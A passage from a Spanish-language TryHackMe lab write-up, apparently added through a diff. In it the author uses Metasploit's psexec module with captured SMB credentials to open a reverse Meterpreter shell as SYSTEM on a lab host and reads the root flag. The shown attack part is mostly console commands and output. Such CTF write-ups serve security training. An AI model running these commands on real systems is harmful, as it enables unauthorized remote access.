+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   encoder/x86/service                                           manual     No     Register Service
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation <span style="color:#f92672">(</span>WMI<span style="color:#f92672">)</span> Remote Command Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 10, use <span style="color:#ae81ff">10</span> or use exploit/windows/local/wmi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; set lhost tun0
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 10.14.50.184
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; set SMBUSER mayor
+</span></span><span style="display:flex;"><span>SMBUSER <span style="color:#f92672">=</span>&gt; mayor
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.223.27
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.223.27
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; set SMBDOMAIN gatekeeper
+</span></span><span style="display:flex;"><span>SMBDOMAIN <span style="color:#f92672">=</span>&gt; gatekeeper
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; set SMBPASS 8CL7O1N78MdrCIsV
+</span></span><span style="display:flex;"><span>SMBPASS <span style="color:#f92672">=</span>&gt; 8CL7O1N78MdrCIsV
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; show options
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.27:445 - Connecting to the server...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.27:445 - Authenticating to 10.10.223.27:445|gatekeeper as user <span style="color:#e6db74">&#39;mayor&#39;</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.27:445 - Selecting PowerShell target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.27:445 - Executing the payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.27:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.223.27
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">4</span> opened <span style="color:#f92672">(</span>10.14.50.184:4444 -&gt; 10.10.223.27:49218<span style="color:#f92672">)</span> at 2023-10-01 23:30:04 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><p>Ahora que he conseguido acceso privilegiado, puedo buscar el fichero root.txt. Lo encuentro en C:\Users\mayor\Desktop\root.txt.txt. Lo leo y obtengo la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f root.*
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">2</span> results...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path                                                                  Size <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>  Modified <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>----                                                                  ------------  --------------
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>ayor<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\R</span>ecent<span style="color:#ae81ff">\r</span>oot.txt.lnk  <span style="color:#ae81ff">558</span>           2020-05-15 04:45:53 +0200
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>ayor<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt.txt                                   <span style="color:#ae81ff">27</span>            2020-05-15 03:21:09 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat c:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\\</span>mayor<span style="color:#ae81ff">\\</span>Desktop<span style="color:#ae81ff">\\</span>root.txt.txt 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>Th3_M4y0r_C0ngr4tul4t3s_U<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><h2 id="conclusiones">Conclusiones</h2>
+<p>Esta sala ha sido bastante más difícil que las anteriores. He tenido que investigar bastante para poder encontrar la forma de escalar privilegios usando firefox. Además del script de python firepwd.py, se supone que hay una forma de hacerlo con Hashcat, pero no supe como hacerlo y tampoco quise invertir mucho tiempo en ello, sabiendo que ya hay una forma de hacerlo con el script de python que es relativamente sencilla. Lo aprendido durante esta sala y los apuntes que he guardado me serán de utilidad en el futuro, no me cabe duda.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/buffer-overflow">#Buffer Overflow</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/exploit-development">#Exploit Development</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hard">#Hard</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/immunity-debugger">#Immunity Debugger</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#Meterpreter</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/mona">#Mona</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/python">#Python</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/reverse-shell">#Reverse Shell</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#Windows</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
